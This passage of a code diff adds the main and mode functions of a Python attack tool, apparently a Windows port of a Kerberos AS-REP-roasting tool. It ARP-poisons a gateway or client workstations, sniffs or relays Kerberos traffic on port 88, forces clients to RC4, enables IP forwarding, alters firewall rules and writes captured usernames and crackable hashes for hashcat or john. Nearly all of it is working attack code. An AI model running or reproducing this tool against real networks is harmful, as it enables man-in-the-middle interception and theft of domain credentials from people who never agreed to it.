+            port_88_lines = [line for line in lines if ':88 ' in line and 'LISTENING' in line]
+            if port_88_lines:
+                rich_print_info('[RELAY] Current port 88 usage:', 'yellow')
+                for line in port_88_lines[:3]:
+                    rich_print_info(f'[RELAY] {line.strip()}', 'cyan')
+        except Exception:
+            pass
+        
+        # Suggest solutions
+        rich_print_info('[RELAY] Possible solutions:', 'yellow')
+        rich_print_info('[RELAY] 1. Stop conflicting services (like Windows KDC)', 'cyan')
+        rich_print_info('[RELAY] 2. Use --port to specify an alternative port', 'cyan')
+        rich_print_info('[RELAY] 3. Use --disable-spoofing mode if you control traffic redirection externally', 'cyan')
+        rich_print_info('[RELAY] 4. Run the diagnostic utilities: python diagnose_port88.py', 'cyan')
+        
+        raise
+
+# ============================================================================
+# MODE FUNCTIONS
+# ============================================================================
+
+def listen_mode():
+    global AllUsernames
+    
+    # RESET the stop flag to ensure clean start - this fixes early exit issue
+    stop_arp_spoofing_flag.clear()
+    rich_print_info('[LISTEN] Reset stop flag - ensuring clean startup', 'cyan')
+    
+    try :
+        # Start ARP spoofing in background (if enabled)
+        if not disable_spoofing:
+            thread = threading.Thread(target=listenmode_arp_spoof)
+            thread.daemon = True
+            thread.start()
+            rich_print_info('[+] ARP spoofing started in background', 'green')
+        
+        # SIMPLIFIED: Use basic port 88 filter like the working Linux version
+        rich_print_info('[LISTEN] Starting packet capture - LINUX ARP METHOD...', 'green')
+        rich_print_info('[LISTEN] Filter: "src port 88" (same as working Linux version)', 'cyan')
+        rich_print_info(f'[LISTEN] Targets: {list(Targets)}, Gateway: {gw}', 'cyan')
+        rich_print_info('[LISTEN] ARP METHOD: Batch poisoning gateway cache (Linux approach)', 'yellow')
+        
+        # Note about ICMP redirects - these are normal and expected
+        rich_print_warning('[LISTEN] NOTE: ICMP redirects are normal during ARP spoofing')
+        rich_print_warning('[LISTEN] They indicate network is responding to our ARP poisoning')
+        rich_print_warning('[LISTEN] Not a problem - shows routing is being affected as intended')
+        
+        # Windows-specific: Enable promiscuous mode to capture redirected packets + TCP sessions
+        rich_print_info('[LISTEN] Using Windows promiscuous mode with TCP session support', 'yellow')
+        rich_print_info('[LISTEN] TCP sessions enable proper packet reassembly for Kerberos', 'yellow')
+        rich_print_info('[LISTEN] Press Ctrl+C to stop packet capture...', 'cyan')
+        
+        # CRITICAL: Import and use TCPSession for proper packet reassembly on Windows
+        try:
+            from scapy.sessions import TCPSession
+            tcp_session_available = True
+            rich_print_success('[TCP SESSION] TCP session support available - enables packet reassembly')
+        except ImportError:
+            tcp_session_available = False
+            rich_print_warning('[TCP SESSION] TCP session support not available - using basic mode')
+        
+        # Enhanced loop with longer capture sessions and better error handling
+        rich_print_info('[LISTEN] Starting continuous packet capture loop...', 'green')
+        
+        capture_round = 0
+        while not stop_arp_spoofing_flag.is_set():
+            try:
+                capture_round += 1
+                if debug:
+                    rich_print_info(f'[LISTEN] Capture round {capture_round} starting', 'cyan')
+                
+                # Use longer capture sessions to reduce loop overhead
+                if tcp_session_available:
+                    # Use TCPSession for proper TCP reassembly (critical for Kerberos over TCP)
+                    sniff(
+                        filter="src port 88", 
+                        prn=parse_dc_response, 
+                        iface=iface, 
+                        store=False, 
+                        promisc=True, 
+                        session=TCPSession,  # CRITICAL: TCP packet reassembly
+                        count=50,  # Increased from 10 to reduce loop frequency
+                        timeout=10  # Increased from 2 to reduce CPU usage
+                    )
+                else:
+                    # Fallback without TCP session
+                    sniff(
+                        filter="src port 88", 
+                        prn=parse_dc_response, 
+                        iface=iface, 
+                        store=False, 
+                        promisc=True, 
+                        count=50,  # Increased from 10
+                        timeout=10  # Increased from 2
+                    )
+                
+                # Add small sleep to prevent tight loop if sniff returns immediately
+                if not stop_arp_spoofing_flag.is_set():
+                    time.sleep(0.1)
+                    
+            except KeyboardInterrupt:
+                rich_print_info('[LISTEN] Keyboard interrupt in capture loop', 'yellow')
+                break
+            except Exception as sniff_e:
+                if "timeout" not in str(sniff_e).lower():
+                    rich_print_warning(f'[LISTEN] Sniff exception (round {capture_round}): {sniff_e}')
+                    if debug:
+                        import traceback
+                        rich_print_info(f'[LISTEN DEBUG] Exception details: {traceback.format_exc()}', 'cyan')
+                # Continue the loop regardless - don't let exceptions stop listening
+                time.sleep(0.5)  # Brief pause on error
+        
+    except KeyboardInterrupt:
+        rich_print_info('\n[LISTEN] Packet capture stopped by user', 'yellow')
+        stop_arp_spoofing_flag.set()  # Ensure ARP spoofing stops
+    except Exception as e:
+        rich_print_error(f'[LISTEN] Error in listen mode: {e}')
+        if debug:
+            import traceback
+            rich_print_info(f'[LISTEN DEBUG] Full traceback: {traceback.format_exc()}', 'cyan')
+    finally :
+        # Stop live display before cleanup messages
+        stop_live_display()
+        console.print()  # Add newline
+        
+        # Use centralized cleanup
+        cleanup_all()
+        
+        # Save captured usernames and hashes
+        AllUsernames.update(UsernamesSeen.union(UsernamesCaptured))
+        if AllUsernames != set() :
+            with open(usersfile, 'w') as f :
+                f.write('\n'.join(list(AllUsernames)) + '\n')
+            rich_print_success(f'Listed seen usernames in file {usersfile}')
+        if UsernamesCaptured != {} :
+            rich_print_success(f'Listed hashes in file {outfile}')
+
+def relay_mode():
+    global AllUsernames
+    try:
+        # Update display to show we're now relaying
+        update_live_display()
+        asyncio.run(kerberos_server())
+    except KeyboardInterrupt:
+        pass
+    finally :
+        # Stop live display before cleanup messages
+        stop_live_display()
+        console.print()  # Add newline
+        
+        # Use centralized cleanup
+        cleanup_all()
+        
+        # Save captured usernames and hashes
+        AllUsernames.update(UsernamesSeen.union(UsernamesCaptured))
+        if AllUsernames != set() :
+            with open(usersfile, 'w') as f :
+                f.write('\n'.join(list(AllUsernames)) + '\n')
+            rich_print_success(f'Listed seen usernames in file {usersfile}')
+        if UsernamesCaptured != {} :
+            rich_print_success(f'Listed hashes in file {outfile}')
+
+# ============================================================================
+# MAIN FUNCTION
+# ============================================================================
+
+def main():
+    # Set up signal handlers for graceful cleanup IMMEDIATELY
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+    
+    # Register cleanup function to run on normal exit
+    atexit.register(cleanup_all)
+    
+    # Initialize Rich console first
+    global setup_complete
+    setup_complete = False
+    
+    # Check for Kerberos layer availability
+    if not KERBEROS_LAYERS_AVAILABLE:
+        rich_print_error('[CRITICAL] Scapy Kerberos layers are NOT available!')
+        rich_print_error('[CRITICAL] This script requires proper Kerberos support to work')
+        rich_print_error('[CRITICAL] Install with: pip install scapy[complete]')
+        rich_print_error('[CRITICAL] Or ensure scapy.layers.kerberos module is available')
+        rich_print_warning('[WARNING] Continuing anyway, but packet detection WILL NOT WORK')
+        time.sleep(3)
+    else:
+        rich_print_success('[IMPORT] ✓ Scapy Kerberos layers successfully loaded')
+    
+    global mode, outfile, usersfile, HashFormat, iface, disable_spoofing, stop_spoofing
+    global gw, dc, debug, hwsrc, Targets, InitialTargets, TargetsList
+    global UsernamesCaptured, UsernamesSeen, AllUsernames, firewall_backup_file, original_ip_forward
+    global relay_port, skip_redirection
+    
+    display_banner()
+
+    parser = argparse.ArgumentParser(add_help = True, description = "Catches Kerberos AS-REP packets and outputs it to a crackable format", formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument('mode', choices=['relay', 'listen'], action='store', help="Relay mode  : AS-REQ requests are relayed to capture AS-REP. Clients are forced to use RC4 if supported.\n"
+                                                                                    "Listen mode : AS-REP packets going to clients are sniffed. No alteration of packets is performed.")
+    parser.add_argument('-outfile', action='store', help='Output file name to write hashes to crack.')
+    parser.add_argument('-usersfile', action='store', help='Output file name to write discovered usernames.')
+    parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat', help='Format to save the AS_REP hashes. Default is hashcat.')
+    parser.add_argument('-debug', action='store_true', default=False, help='Increase verbosity.')
+    group = parser.add_argument_group('ARP poisoning')
+    group.add_argument('-t', action='store', metavar = "Client workstations", help='Comma separated list of client computers IP addresses or subnet (IP/mask). In relay mode they will be poisoned. In listen mode, the AS-REP directed to them are captured. Default is whole subnet.')
+    group.add_argument('-tf', action='store', metavar = "targets file", help='File containing client workstations IP addresses.')
+    group.add_argument('-gw', action='store', metavar = "Gateway IP", help='Gateway IP. More generally, the IP from which the AS-REP will be coming from. If DC is in the same VLAN, then specify the DC\'s IP. In listen mode, only this IP\'s ARP cache is poisoned. Default is default interface\'s gateway.')
+    parser.add_argument('-dc', action='store', metavar = "DC IP", help='Domain controller\'s IP.')
+    parser.add_argument('-iface', action='store', metavar = "interface", help='Interface to use. Uses default interface if not specified.')
+    parser.add_argument('--port', action='store', type=int, default=88, metavar="PORT", help='Port to use for relay server (default: 88). Use alternative port if 88 is in use.')
+    parser.add_argument('--skip-redirection', action='store_true', default=False, help='Skip setting up traffic redirection (useful for testing or when using external redirection)')
+    group.add_argument('--stop-spoofing', action='store_true', default=False, help='Stops poisoning the target once an AS-REP packet is received from it. False by default.')
+    group.add_argument('--disable-spoofing', action='store_true', default=False, help='Disables arp spoofing, the MitM position is attained by the attacker using their own method. False by default : the tool uses its own arp spoofing method.')
+
+    if len(sys.argv)==1:
+        parser.print_help()
+        sys.exit(1)
+
+    if not is_admin():
+        rich_print_error("Please run as Administrator")
+        sys.exit(1)
+
+    parameters = parser.parse_args()
+
+    if parameters.t is not None and parameters.tf is not None :
+        rich_print_error('Cannot use -t and -tf simultaneously')
+        sys.exit(1)
+
+    # Parse arguments and set global variables
+    mode = parameters.mode
+    outfile = parameters.outfile if parameters.outfile is not None else 'asrep_hashes.txt'
+    usersfile = parameters.usersfile if parameters.usersfile is not None else 'usernames.seen'
+    HashFormat = parameters.format
+    iface = parameters.iface if parameters.iface is not None else conf.iface
+    disable_spoofing = parameters.disable_spoofing
+    stop_spoofing = parameters.stop_spoofing
+    dc = parameters.dc
+    debug = parameters.debug
+    relay_port = parameters.port if hasattr(parameters, 'port') else 88
+    skip_redirection = parameters.skip_redirection if hasattr(parameters, 'skip_redirection') else False
+
+    # Validate and select interface
+    if iface not in get_if_list():
+        if parameters.iface is not None:
+            logging.error(f'[!] Interface {iface} was not found. Quitting...')
+            sys.exit(1)
+        else:
+            logging.warning(f'[!] Default interface {iface} is not valid on this system.')
+            print('[*] Available interfaces will be shown for selection...')
+            iface = select_interface()
+            if not iface:
+                logging.error('[!] No interface selected. Quitting...')
+                sys.exit(1)
+
+    # Set gateway after interface is confirmed
+    try:
+        gw = parameters.gw if parameters.gw is not None else netifaces.gateways()['default'][netifaces.AF_INET][0]
+        rich_print_info(f'[CONFIG] Gateway set to: {gw} (from {"command line" if parameters.gw else "auto-detected default route"})', 'cyan')
+    except Exception as e:
+        if parameters.gw is not None:
+            gw = parameters.gw
+            rich_print_info(f'[CONFIG] Using specified gateway: {gw}', 'cyan')
+        else:
+            rich_print_error(f'[CONFIG] Could not auto-detect gateway: {e}')
+            rich_print_error('[CONFIG] Please specify gateway with -gw argument')
+            sys.exit(1)
+
+    if iface != conf.iface and parameters.gw is None and not disable_spoofing :
+        logging.error('[!] Specified interface is not the default one. You have to specify gateway IP')
+        sys.exit(1)
+
+    if stop_spoofing and disable_spoofing :
+        logging.warning('[!] --stop-spoofing used with --disable-spoofing. Will ignore --stop-spoofing')
+        stop_spoofing = False
+
+    if debug :
+        logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.DEBUG, force=True)
+        logging.getLogger('asyncio').setLevel(logging.INFO)
+    else :
+        logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO, force=True)
+
+    if parameters.mode == 'relay' and parameters.dc is None :
+        logging.error('[!] Must specify DC IP in relay mode. Quitting...')
+        sys.exit(1)
+
+    if parameters.dc is not None and not valid_ip(parameters.dc) :
+        logging.error('[!] DC is not a valid IP.')
+        sys.exit(1)
+
+    if parameters.gw is not None and not valid_ip(parameters.gw) :
+        logging.error('[!] Gateway is not a valid IP.')
+        sys.exit(1)
+
+    # Network interface configuration - with fallback to interface selection
+    rich_print_info('Starting network interface configuration...', 'cyan')
+    rich_print_info('Processing interface with timeout protection...', 'blue')
+    
+    # Don't check stop flag during initialization - this was causing early exits
+    # The stop flag should only be checked AFTER we start the main mode operations
+    
+    try:
+        rich_print_info('Getting interface IP address...', 'blue')
+        # Use Scapy functions to get interface details since we're using Scapy names
+        iface_ip = get_if_addr(iface)
+        if debug:
+            rich_print_info(f'Interface IP: {iface_ip}', 'blue')
+        if not iface_ip or iface_ip == '0.0.0.0':
+            raise ValueError(f"Interface {iface} has no valid IP address")
+        
+        rich_print_info('Setting up default netmask and MAC...', 'blue')
+        # Try to get netmask and MAC from netifaces if possible
+        netmask = '255.255.255.0'  # Default fallback
+        hwsrc = None
+        
+        # Removed stop flag check - was causing premature exits
+        
+        try:
+            if debug:
+                rich_print_info('Attempting to get interface details from netifaces...', 'blue')
+            # Try to find corresponding netifaces interface by IP matching
+            for neti_name in netifaces.interfaces():
+                # Removed stop flag check in loop - let initialization complete
+                
+                try:
+                    neti_addrs = netifaces.ifaddresses(neti_name)
+                    if netifaces.AF_INET in neti_addrs:
+                        neti_ip = neti_addrs[netifaces.AF_INET][0].get('addr', '')
+                        if neti_ip == iface_ip:
+                            netmask = neti_addrs[netifaces.AF_INET][0].get('netmask', '255.255.255.0')
+                            # Get MAC address
+                            if netifaces.AF_LINK in neti_addrs:
+                                hwsrc = neti_addrs[netifaces.AF_LINK][0].get('addr')
+                            break
+                except:
+                    continue
+        except:
+            pass
+        
+        if debug:
+            rich_print_info('Netifaces processing completed', 'blue')
+        # If we couldn't get MAC from netifaces, use a fallback
+        if not hwsrc:
+            hwsrc = "00:00:00:00:00:00"  # Will be detected/updated later by ARP operations
+        
+        if debug:
+            rich_print_info(f'Final interface details - IP: {iface_ip}, MAC: {hwsrc}, Netmask: {netmask}', 'blue')
+            rich_print_info('Creating subnet configuration...', 'blue')
+        iface_subnet = ipaddress.IPv4Network(f'{iface_ip}/{netmask}', strict=False)
+        if debug:
+            rich_print_info(f'Interface subnet: {iface_subnet}', 'blue')
+        rich_print_success('Network interface configuration completed successfully')
+        
+    except Exception as e:
+        if debug:
+            rich_print_error(f'Interface configuration failed: {e}')
+        rich_print_warning(f'Could not get interface details for {iface}: {e}')
+        rich_print_info('Available interfaces will be shown for selection...')
+        iface = select_interface()
+        if not iface:
+            logging.error('[!] No interface selected. Quitting...')
+            sys.exit(1)
+        
+        # Try again with selected interface
+        try:
+            # Removed stop flag check during retry - let initialization complete
+                
+            iface_ip = get_if_addr(iface)
+            if not iface_ip or iface_ip == '0.0.0.0':
+                raise ValueError(f"Selected interface {iface} has no valid IP address")
+            
+            # Try to get additional details
+            netmask = '255.255.255.0'  # Default fallback
+            hwsrc = None
+            
+            try:
+                # Try to find corresponding netifaces interface by IP matching
+                for neti_name in netifaces.interfaces():
+                    # Removed stop flag check in retry loop - let initialization complete
+                        
+                    try:
+                        neti_addrs = netifaces.ifaddresses(neti_name)
+                        if netifaces.AF_INET in neti_addrs:
+                            neti_ip = neti_addrs[netifaces.AF_INET][0].get('addr', '')
+                            if neti_ip == iface_ip:
+                                netmask = neti_addrs[netifaces.AF_INET][0].get('netmask', '255.255.255.0')
+                                # Get MAC address
+                                if netifaces.AF_LINK in neti_addrs:
+                                    hwsrc = neti_addrs[netifaces.AF_LINK][0].get('addr')
+                                break
+                    except:
+                        continue
+            except:
+                pass
+            
+            if not hwsrc:
+                hwsrc = "00:00:00:00:00:00"  # Will be detected/updated later
+                
+            iface_subnet = ipaddress.IPv4Network(f'{iface_ip}/{netmask}', strict=False)
+            
+        except Exception as e2:
+            logging.error(f'[!] Could not configure selected interface {iface}: {e2}')
+            sys.exit(1)
+
+    if parameters.gw is not None and ipaddress.ip_address(parameters.gw) not in ipaddress.ip_network(iface_subnet) :
+        logging.error(f'[!] Gateway not in {iface} subnet. Quitting...')
+        sys.exit(1)
+
+    if parameters.dc is not None and not is_dc_up(dc):
+        logging.error('[!] DC did not respond to TCP/88 ping probe. Quitting...')
+        sys.exit(1)
+
+    if parameters.dc is not None and ipaddress.ip_address(dc) in ipaddress.ip_network(iface_subnet) :
+        if parameters.gw is None :
+            if mode == 'relay' :
+                logging.info('[*] DC seems to be in the same VLAN, will spoof as DC\'s IP')
+            else :
+                logging.info('[*] DC seems to be in the same VLAN, will poison the DC\'s ARP cache')
+            gw = dc
+        elif parameters.gw != dc :
+            logging.warning('[!] DC seems to be in the same VLAN, will ignore -gw parameter')
+            gw = dc
+
+    if not disable_spoofing :
+        if parameters.iface is None :
+            logging.info(f'[*] No interface specified, will use the default interface : {iface}')
+        else :
+            logging.info(f'[*] Interface : {iface}')
+        if parameters.gw is None and dc != gw:
+            logging.info(f'[*] No gateway specified, will use the default gateway : {gw}')
+        elif parameters.gw is not None and dc != gw :
+            logging.info(f'[*] Gateway IP : {gw}')
+
+    # Initialize usernames sets
+    UsernamesCaptured = {}
+    UsernamesSeen = set()
+
+    try :
+        with open(usersfile, 'r') as f :
+            AllUsernames = set(f.read().strip().split('\n'))
+    except :
+        AllUsernames = set()
+
+    # Handle output file naming
+    if os.path.isfile(outfile) :
+        i = 1
+        while os.path.isfile(f'{outfile}.{i}') :
+            # Removed stop flag check during file naming - let initialization complete
+            i += 1
+        outfile += f'.{i}'
+
+    # Removed stop flag check before firewall operations - these were causing early exits
+
+    # Backup firewall rules
+    firewall_backup_file = backup_firewall_rules()
+    if not firewall_backup_file:
+        logging.error('[!] Could not create any firewall backup. Quitting.')
+        sys.exit(1)
+    logging.debug('[*] Firewall backup completed')
+
+    # Removed stop flag check before IP forwarding - let initialization complete
+
+    # Get current IP forwarding status and enable it if needed
+    original_ip_forward = get_ip_forwarding_status()
+    if not original_ip_forward:
+        if not enable_ip_forwarding():
+            logging.error('[!] Could not enable IP forwarding. Quitting.')
+            # Restore firewall backup before exiting
+            restore_firewall_rules(firewall_backup_file)
+            sys.exit(1)
+        logging.debug('[*] Enabled IP forwarding')
+
+    # Removed stop flag check after IP forwarding - let initialization complete
+
+    if parameters.mode == 'listen':
+        configure_firewall_forwarding()
+
+    # Target configuration
+    if not disable_spoofing :
+        if parameters.t is not None :
+            if is_valid_ip_list(parameters.t.replace(' ','')) :
+                TargetsList = parameters.t.replace(' ','').split(',')
+            elif is_valid_ipwithmask(parameters.t) :
+                subnet = ipaddress.ip_network(parameters.t, strict=False)
+                TargetsList = [str(ip) for ip in subnet.hosts()]
+            else :
+                logging.error('[!] IP list in a bad format, expected format : 192.168.1.2,192.168.1.3,192.168.1.5 OR 192.168.1.0/24')
+                sys.exit(1)
+        elif parameters.tf is not None :
+            print('[DEBUG] Processing target list from file...')
+            try :
+                with open(parameters.tf, 'r') as f:
+                    iplist = f.read().strip().replace('\n',',')
+            except Exception as e :
+                logging.error(f'[-] Could not open file : {e}')
+                sys.exit(1)
+            if not is_valid_ip_list(iplist) :
+                logging.error('[!] IP list in a bad format')
+                sys.exit(1)
+            TargetsList = iplist.split(',')
+        else :
+            TargetsList = [str(ip) for ip in iface_subnet.hosts()]
+            TargetsList.remove(gw)
+            logging.info(f'[*] Targets not supplied, will use local subnet {iface_subnet} minus the gateway')
+
+        if gw in TargetsList and (parameters.t is not None or parameters.tf is not None) :
+            logging.info('[*] Found gateway in targets list. Removing it')
+            TargetsList.remove(gw)
+
+        my_ip = get_if_addr(iface)
+        if my_ip in TargetsList :
+            TargetsList.remove(my_ip)
+        
+        ip_addresses_not_in_iface_subnet = []
+        if parameters.t is not None or parameters.tf is not None :
+            logging.debug('[*] Checking targets list...')
+            ip_addresses_not_in_iface_subnet = [ip for ip in set(TargetsList) if ipaddress.ip_address(ip) not in ipaddress.ip_network(iface_subnet)]
+        if len(ip_addresses_not_in_iface_subnet) > 0 :
+            logging.debug(f'[-] These IP addresses are not in {iface} subnet and will be removed from targets list : {ip_addresses_not_in_iface_subnet}')
+            logging.warning('[!] Some IP addresses were removed from the targets list. Run in debug mode for more details.')
+        if set(TargetsList) == set(ip_addresses_not_in_iface_subnet) : 
+            logging.error(f'[-] No target IP was in {iface} subnet. Quitting...')
+            sys.exit(1)
+
+        logging.debug('[*] ARP ping : discovering targets')
+        print('[DEBUG] Starting ARP discovery for targets...')
+        print(f'[DEBUG] Target list has {len(TargetsList)} IPs, plus gateway: {gw}')
+        
+        # Removed stop flag check before ARP discovery - let initialization complete
+            
+        mac_addresses = get_mac_addresses(TargetsList + [gw])
+        print(f'[DEBUG] ARP discovery completed, found {len(mac_addresses)} responding hosts')
+
+        # Removed stop flag check after ARP discovery - let initialization complete
+
+        if gw not in mac_addresses :
+            if gw == dc :
+                logging.error('[-] DC did not respond to ARP. Quitting...')
+            else :
+                logging.error('[-] Gateway did not respond to ARP. Quitting...')
+            # Cleanup before exit
+            cleanup_all()
+            sys.exit(1)
+
+        Targets = set(TargetsList) - set(ip_addresses_not_in_iface_subnet)
+        InitialTargets = set(TargetsList) - set(ip_addresses_not_in_iface_subnet)
+
+        print(f'[DEBUG] Final target configuration - Targets: {list(Targets)}, InitialTargets: {list(InitialTargets)}')
+
+        if parameters.mode == 'listen':
+            print('[DEBUG] Starting listen mode ARP spoofing thread...')
+            thread = threading.Thread(target=listenmode_arp_spoof)
+            thread.daemon = True  # Allow main program to exit even if thread is running
+            thread.start()
+            print('[DEBUG] ARP spoofing thread started successfully')
+            if dc != gw : logging.info('[+] ARP poisoning the gateway\n')
+        elif parameters.mode == 'relay' :
+            print('[DEBUG] Starting relay mode ARP spoofing...')
+            Targets.intersection_update(set(mac_addresses.keys()))
+            if Targets == set() :
+                logging.error('[-] No target responded to ARP. Quitting...')
+                # Cleanup before exit
+                cleanup_all()
+                sys.exit(1)
+            thread = threading.Thread(target=relaymode_arp_spoof, args=(gw,))
+            thread.daemon = True  # Allow main program to exit even if thread is running
+            thread.start()
+            print('[DEBUG] Relay mode ARP spoofing thread started')
+            logging.info('[+] ARP poisoning the client workstations')
+        logging.debug(f'[*] Net probe check, targets list : {list(Targets)}')
+    else :
+        logging.warning(f'[!] ARP spoofing disabled')
+
+    # Removed stop flag check before mode execution - let the actual mode handle interrupts
+    # The flag should only be checked AFTER initialization is complete, within the actual mode
+
+    # Setup is complete, mark it and start live display
+    setup_complete = True
+    rich_print_success('Configuration completed successfully!')
+    rich_print_info(f'Starting {mode} mode with Rich live display...', 'green')
+    
+    # Windows packet capture troubleshooting info
+    if mode == 'listen':
+        rich_print_info('Windows Packet Capture Requirements:', 'yellow')
+        rich_print_info('1. WinPcap or Npcap must be installed', 'white')
+        rich_print_info('2. Must run as Administrator', 'white')
+        rich_print_info('3. Windows Defender/Firewall may block packet capture', 'white')
+        rich_print_info('4. Some corporate networks block raw packet capture', 'white')
+        if not is_admin():
+            rich_print_warning('Not running as Administrator - packet capture may fail!')
+    
+    # Start the live display
+    start_live_display()
+
+    # Execute the appropriate mode
+    try:
+        if mode == 'relay' :
+            rich_print_info('Starting relay mode execution...')
+            relay_mode()
+        else :
+            rich_print_info('Starting listen mode execution...')
+            listen_mode()
+    except Exception as e:
+        # Stop live display on error
+        stop_live_display()
+        rich_print_error(f'Unexpected error during execution: {e}')
+        rich_print_warning('Performing emergency cleanup...')
+        cleanup_all()
+        sys.exit(1)
+    finally:
+        # Always stop live display when exiting
+        stop_live_display()
+
+if __name__ == '__main__':
+    main()
+
+# Note: This script requires proper Scapy Kerberos layer support
+# If Scapy Kerberos layers are not available, install with: pip install scapy[complete]
+# or ensure scapy.layers.kerberos module is properly installed
